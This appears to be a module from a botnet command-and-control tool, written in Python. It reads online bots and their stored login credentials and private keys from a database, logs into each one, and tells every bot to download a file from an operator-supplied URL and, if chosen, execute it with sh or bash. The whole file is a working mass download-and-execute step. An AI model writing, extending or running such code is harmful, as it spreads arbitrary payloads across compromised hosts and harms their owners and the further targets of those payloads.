from modules import db,bot,printer
def main():
    db.connect()
    hosts=db.get_online()
    shells=['sh','bash','']
    options=['','y','n']
    interpreter=""
    execute=""
    url=input(printer.color_red("Enter url > "))
    dest=input(printer.color_cyan("Enter The Directory To Save > "))
    execute=input(printer.color_cyan("Do you wish to execute Enter y or n ?Default is n press enter to leave default > "))
    if not execute == "":
        while not execute.lower() in options:
            execute=input("Enter y or n > ")
        if execute == "y":
            interpreter=input(printer.color_cyan("Enter the interpreter to use... Default is sh ..press enter to leave default > "))
            while not interpreter.lower() in shells:
                interpreter=input("please specify bash or sh > ")
        if execute == "n":
            interpreter="n"

    for ip in hosts:
        id,host,port,username,password,pkey,session=ip
        printer.print_success("Connecting to Bot:%s"%host)
        if(str(pkey)=='None'):
            pkey=''
        if(bot.connect(host,port,username,password,pkey)):
            bot.downloader(dest,url,execute,interpreter)
